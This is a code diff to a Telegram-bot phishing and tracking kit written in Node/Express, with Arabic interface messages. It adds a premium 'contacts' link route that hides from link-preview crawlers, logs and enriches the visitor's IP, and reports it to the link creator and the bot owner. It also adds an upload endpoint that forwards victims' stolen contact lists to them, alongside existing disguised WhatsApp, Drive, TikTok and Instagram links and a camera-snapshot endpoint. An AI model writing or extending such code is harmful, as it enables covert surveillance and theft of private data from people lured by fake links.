@@ -1,5 +1,7 @@
 const fs = require("fs");
 const express = require("express");
+const multer  = require("multer");
+const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 15*1024*1024 } });
 
 // ── Storage helpers ────────────────────────────────────────────────────────────
 
@@ -296,6 +298,29 @@ app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLin
 app.get("/dl/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "download"); });
 app.get("/tt/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "tiktok"); });
 app.get("/ig/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "instagram"); });
+
+// ── Contacts route (premium only) ─────────────────────────────────────────────
+app.get("/co/:path/*", async (req, res) => {
+  const ua = (req.headers['user-agent'] || '').toLowerCase();
+  if (ua.includes('telegrambot') || ua.includes('twitterbot') || ua.includes('facebookexternalhit')) return res.status(200).send('OK');
+  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");
+  const creatorId = parseInt(req.params.path, 36);
+  if (!isPremium(creatorId)) return res.send('<h2 style="font-family:sans-serif;text-align:center;margin-top:20%">⛔ هذه الميزة للمشتركين المدفوعين فقط</h2>');
+  const ip = getIP(req);
+  const d  = new Date().toJSON().slice(0,19).replace('T',':');
+  stats.linksOpened++; saveStats();
+  incUserStat(String(creatorId), 'linksOpened');
+  const flag = targets.has(creatorId) ? '🎯🚨' : '⚠️';
+  notify(creatorId, `${flag} تم فتح رابط جهات الاتصال!\n⚓ IP: ${ip}\n⏰ ${d} UTC`);
+  if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `${flag} رابط اتصالات! ID: ${creatorId}\n⚓ ${ip}\n⏰ ${d} UTC`);
+  enrichIP(ip).then(info => {
+    if (!info) return;
+    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
+    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
+  });
+  const redirectUrl = Buffer.from(req.params[0], 'base64').toString('utf8');
+  res.render("contacts", { uid: req.params.path, a: hostURL, redirectUrl });
+});
 
 // ── Bot Logic ─────────────────────────────────────────────────────────────────
 
@@ -863,9 +888,11 @@ async function createLink(cid, msg) {
     const dlLink = `${hostURL}/dl/${url}`;
     const ttLink = `${hostURL}/tt/${url}`;
     const igLink = `${hostURL}/ig/${url}`;
+    const coLink = `${hostURL}/co/${url}`;
     lastLink.set(String(cid), cLink);
+    const premiumSection = isPremium(cid) ? `\n\n📒 جهات الاتصال (بريميوم):\n${coLink}` : "";
     bot.sendMessage(cid,
-      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}`,
+      `✅ تم إنشاء الروابط!\n🔗 URL: ${trimmed}\n\n🛡️ Cloudflare:\n${cLink}\n\n🖥️ WebView:\n${wLink}\n\n💬 WhatsApp:\n${waLink}\n\n📁 Google Drive:\n${dlLink}\n\n🎵 TikTok:\n${ttLink}\n\n📷 Instagram:\n${igLink}${premiumSection}`,
       { reply_markup: JSON.stringify({ inline_keyboard: [
         [{ text:"🔗 إنشاء رابط جديد", callback_data:"crenew" }],
         [{ text:"📷 QR Code", callback_data:`qr:${cid}` }]
@@ -968,6 +995,23 @@ function flushCamAlbum(tid) {
     }
   }
 }
+
+// ── Contacts file upload (premium) ────────────────────────────────────────────
+app.post("/contacts-file", upload.single('file'), (req, res) => {
+  const uid      = req.body?.uid || null;
+  const count    = req.body?.count || '?';
+  const filename = req.body?.filename || 'contacts.txt';
+  if (!uid || !req.file) return res.send("Missing");
+  const tid  = parseInt(uid, 36);
+  const buf  = req.file.buffer;
+  const info = { filename, contentType: 'text/plain' };
+  const cap  = `📒 جهات الاتصال: ${count} جهة اتصال`;
+  if (!settings.silentMode) {
+    bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
+    if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
+  }
+  res.send("Done");
+});
 
 app.post("/camsnap", (req, res) => {
   const uid = decodeURIComponent(req.body.uid) || null;
